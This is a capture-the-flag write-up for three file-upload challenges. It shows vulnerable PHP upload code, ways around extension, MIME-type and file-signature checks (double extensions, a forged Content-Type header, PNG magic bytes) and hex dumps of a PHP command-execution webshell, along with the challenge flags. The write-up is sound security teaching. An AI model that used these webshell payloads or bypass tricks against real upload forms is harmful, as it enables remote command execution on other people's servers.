# Chal

Tag: `Upload`

## Challenge 1

[http://h4ck3r.quest:9010/](http://h4ck3r.quest:9010/)

## Writeup 1

No protection, just upload any webshell you like.

## Flag 1

`FLAG{upl0ad_t0_pwn!!!}`

## Challenge 2

[http://h4ck3r.quest:9011/](http://h4ck3r.quest:9011/)

## Writeup 2

Check the extension. Change filename to `shell.jpg.php` works.

## Flag 2

`FLAG{ext3ns10n_ch3ck_f4il3d}`

## Challenge 3

[http://h4ck3r.quest:9012/](http://h4ck3r.quest:9012/)

## Writeup 3

Source:

```php
<?php
if (!isset($_FILES['image_file'])) {
    die('Give me a file!');
}

$filename = basename($_FILES['image_file']['name']);
$extension = strtolower(explode(".", $filename)[1]);

if (!in_array($extension, ['png', 'jpeg', 'jpg']) !== false) {
    die("Invalid file extension: $extension.");
}

if (in_array($_FILES['image_file']['type'], ["image/png", "image/jpeg", "image/jpg"]) === false) {
    die("Invalid file type: " . $_SERVER["CONTENT_TYPE"]);
}

list($_, $_, $type) = getimagesize($_FILES['image_file']['tmp_name']);

if ($type !== IMAGETYPE_JPEG && $type !== IMAGETYPE_PNG) {
    die("Invalid image type.");
}

$prefix = bin2hex(random_bytes(8));
move_uploaded_file($_FILES['image_file']['tmp_name'], "images/${prefix}_${filename}");
echo "<img src=\"/images/${prefix}_${filename}\">";
?>
```

It's easy to send a fake file type since we can just modify the header. (Burp Suite again.)

So now we need to fake the file signature. [Ref](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/README.md#upload-tricks)

However, I'm not sure why I cannot fake a jpg file...

```bash
$ xxd shell.jpg.php 
00000000: ffd8 ffe0 0a3c 3f70 6870 2073 7973 7465  .....<?php syste
00000010: 6d28 245f 4745 545b 2763 6d64 275d 293b  m($_GET['cmd']);
00000020: 203f 3e0a                                 ?>.
                                                                                                                                                        
$ file shell.jpg.php
shell.jpg.php: JPEG image data
```

Faking PNG works fine. 

```bash
$ xxd new.jpg.php   
00000000: 8950 4e47 0d0a 1a0a 200d 0a3c 3f70 6870  .PNG.... ..<?php
00000010: 2073 7973 7465 6d28 245f 4745 545b 2763   system($_GET['c
00000020: 6d64 275d 293b 203f 3e0d 0a              md']); ?>..
```

## Flag 3

`FLAG{byp4ss_all_th3_things}`

## Postscript

Uploading file is really dangerous... We need to set up a lot of protection.
